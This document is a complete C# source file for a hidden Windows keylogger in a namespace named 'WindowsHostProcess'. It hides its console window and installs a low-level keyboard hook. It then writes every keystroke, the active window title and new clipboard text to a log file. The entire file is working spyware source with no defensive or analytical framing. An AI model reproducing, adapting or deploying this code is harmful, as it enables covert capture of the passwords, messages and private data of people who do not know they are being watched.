using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;

namespace WindowsHostProcess
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static string preWin = "";
        public static string newWin = "";
        public static int fstWin = 0;
        public static string clipboardText = "";
        public static string oldClipboardText = "";

        [STAThread]
        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide Window
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private static string GetClipboardData()
        {

            if (Clipboard.ContainsText(TextDataFormat.Text))
            {
                clipboardText = "   [CLIPBOARD]   " + Clipboard.GetText(TextDataFormat.Text) 
                              + "   [CLIPBOARD]   " + Environment.NewLine;

                if (clipboardText != oldClipboardText)
                {
                    oldClipboardText = clipboardText;
                    return clipboardText.ToString();
                }                
            }
            return null;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);

                newWin = GetActiveWindowTitle();

                if(newWin != preWin)
                {
                    if (fstWin == 1)
                    {
                        preWin = newWin;
                        sw.Write(Environment.NewLine + Environment.NewLine);
                        sw.Write("*** " + newWin + " ***");
                        sw.Write(Environment.NewLine);
                        string clipboard = GetClipboardData();
                        sw.Write(clipboard);
                    }
                    else
                    {
                        preWin = newWin;
                        sw.Write("*** " + newWin + " ***");
                        sw.Write(Environment.NewLine);
                        fstWin = 1;
                        string clipboard = GetClipboardData();
                        sw.Write(clipboard);
                    }
                }

                switch ((Keys)vkCode)
                {
                    case Keys.NumPad0:
                        sw.Write("0");
                        break;
                    case Keys.NumPad1:
                        sw.Write("1");
                        break;
                    case Keys.NumPad2:
                        sw.Write("2");
                        break;
                    case Keys.NumPad3:
                        sw.Write("3");
                        break;
                    case Keys.NumPad4:
                        sw.Write("4");
                        break;
                    case Keys.NumPad5:
                        sw.Write("5");
                        break;
                    case Keys.NumPad6:
                        sw.Write("6");
                        break;
                    case Keys.NumPad7:
                        sw.Write("7");
                        break;
                    case Keys.NumPad8:
                        sw.Write("8");
                        break;
                    case Keys.NumPad9:
                        sw.Write("9");
                        break;
                    
                    case Keys.Space:
                        sw.Write(" ");
                        break;

                    case Keys.Enter:
                        sw.Write(Environment.NewLine);
                        break;

                    case Keys.LShiftKey:
                        break;

                    case Keys.RShiftKey:
                        break;

                    case Keys.Down:
                        sw.Write("↓");
                        break;

                    case Keys.Up:
                        sw.Write("↑");
                        break;

                    case Keys.Right:
                        sw.Write("→");
                        break;

                    case Keys.Left:
                        sw.Write("←");
                        break;

                    case Keys.CapsLock:
                        sw.Write("{*~CAPS~*}");
                        break;

                    case Keys.Delete:
                        sw.Write("[DEL}");
                        break;

                    case Keys.Insert:
                        sw.Write("{INSERT}");
                        break;

                    case Keys.Home:
                        sw.Write("{HOME}");
                        break;

                    case Keys.PageUp:
                        sw.Write("{PAGE UP}");
                        break;

                    case Keys.PageDown:
                        sw.Write("{PAGE DOWN}");
                        break;

                    case Keys.End:
                        sw.Write("{END}");
                        break;

                    case Keys.NumLock:
                        sw.Write("{NUM}");
                        break;

                    case Keys.Divide:
                        sw.Write("/");
                        break;

                    case Keys.Multiply:
                        sw.Write("*");
                        break;

                    case Keys.Oemcomma:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(",");
                        else
                            sw.Write("<");
                        break;

                    case Keys.OemPeriod:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(".");
                        else
                            sw.Write(">");
                        break;

                    case Keys.OemQuestion:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("/");
                        else
                            sw.Write("?");
                        break;

                    case Keys.OemSemicolon:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(";");
                        else
                            sw.Write(":");
                        break;

                    case Keys.Oemtilde:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("`");
                        else
                            sw.Write("~");
                        break;

                    case Keys.OemOpenBrackets:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("[");
                        else
                            sw.Write("{");
                        break;

                    case Keys.OemCloseBrackets:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("]");
                        else
                            sw.Write("}");
                        break;

                    case Keys.Oemplus:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("=");
                        else
                            sw.Write("+");
                        break;

                    case Keys.OemMinus:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("-");
                        else
                            sw.Write("_");
                        break;

                    case Keys.OemPipe:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("\\");
                        else
                            sw.Write("|");
                        break;

                    case Keys.OemQuotes:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("'");
                        else
                            sw.Write("\"");
                        break;

                    case Keys.LMenu:
                        sw.Write("{ALT}");
                        break;

                    case Keys.RMenu:
                        sw.Write("{ALT}");
                        break;

                    case Keys.LControlKey:
                        sw.Write("{CTRL}");
                        break;

                    case Keys.RControlKey:
                        sw.Write("{^}");
                        break;

                    case Keys.LWin:
                        sw.Write("{WIN}");
                        break;

                    case Keys.RWin:
                        sw.Write("{WIN}");
                        break;

                    case Keys.Tab:
                        sw.Write("    ");
                        break;

                    case Keys.Back:
                        sw.Write("{BACK}");
                        break;

                    case Keys.F1:
                        sw.Write("{F1}");
                        break;

                    case Keys.F2:
                        sw.Write("{F2}");
                        break;

                    case Keys.F3:
                        sw.Write("{F3}");
                        break;

                    case Keys.F4:
                        sw.Write("{F4}");
                        break;

                    case Keys.F5:
                        sw.Write("{F5}");
                        break;

                    case Keys.F6:
                        sw.Write("{F6}");
                        break;

                    case Keys.F7:
                        sw.Write("{F7}");
                        break;

                    case Keys.F8:
                        sw.Write("{F8}");
                        break;

                    case Keys.F9:
                        sw.Write("{F9}");
                        break;

                    case Keys.F10:
                        sw.Write("{F10}");
                        break;

                    case Keys.F11:
                        sw.Write("{F11}");
                        break;

                    case Keys.F12:
                        sw.Write("{F12}");
                        break;

                    case Keys.F13:
                        sw.Write("{F13}");
                        break;

                    case Keys.F14:
                        sw.Write("{F14}");
                        break;

                    case Keys.F15:
                        sw.Write("{F15}");
                        break;

                    case Keys.F16:
                        sw.Write("{F16}");
                        break;

                    case Keys.F17:
                        sw.Write("{F17}");
                        break;

                    case Keys.F18:
                        sw.Write("{F18}");
                        break;

                    case Keys.F19:
                        sw.Write("{F19}");
                        break;

                    case Keys.F20:
                        sw.Write("{F20}");
                        break;

                    case Keys.F21:
                        sw.Write("{F21}");
                        break;

                    case Keys.F22:
                        sw.Write("{F22}");
                        break;

                    case Keys.F23:
                        sw.Write("{F23}");
                        break;

                    case Keys.F24:
                        sw.Write("{F24}");
                        break;

                    case Keys.PrintScreen:
                        sw.Write("{PrintScreen}");
                        break;

                    case Keys.Scroll:
                        sw.Write("{ScrollLock}");
                        break;

                    case Keys.Pause:
                        sw.Write("{Pause/Break}");
                        break;

                    case Keys.VolumeDown:
                        sw.Write("{Vol↓}");
                        break;

                    case Keys.VolumeUp:
                        sw.Write("{Vol↑}");
                        break;

                    case Keys.VolumeMute:
                        sw.Write("{VolX}");
                        break;

                    case Keys.MediaPreviousTrack:
                        sw.Write("{PreviousTrack}");
                        break;

                    case Keys.MediaNextTrack:
                        sw.Write("{NextTrack}");
                        break;

                    case Keys.MediaPlayPause:
                        sw.Write("{Play/Pause}");
                        break;

                    case Keys.MediaStop:
                        sw.Write("{MediaStop}");
                        break;

                    case Keys.Apps:
                        sw.Write("{Apps}");
                        break;
                                            
                    default:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(((char)(Keys)vkCode).ToString().ToLower());//Make these lowercase
                        else
                            switch ((Keys)vkCode)
                            {
                                case Keys.D1:
                                    sw.Write("!");
                                    break;
                                case Keys.D2:
                                    sw.Write("@");
                                    break;
                                case Keys.D3:
                                    sw.Write("#");
                                    break;
                                case Keys.D4:
                                    sw.Write("$");
                                    break;
                                case Keys.D5:
                                    sw.Write("%");
                                    break;
                                case Keys.D6:
                                    sw.Write("^");
                                    break;
                                case Keys.D7:
                                    sw.Write("&");
                                    break;
                                case Keys.D8:
                                    sw.Write("*");
                                    break;
                                case Keys.D9:
                                    sw.Write("(");
                                    break;
                                case Keys.D0:
                                    sw.Write(")");
                                    break;
                                default:
                                    sw.Write((Keys)vkCode);
                                    break;
                            }
                        break;
                }
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
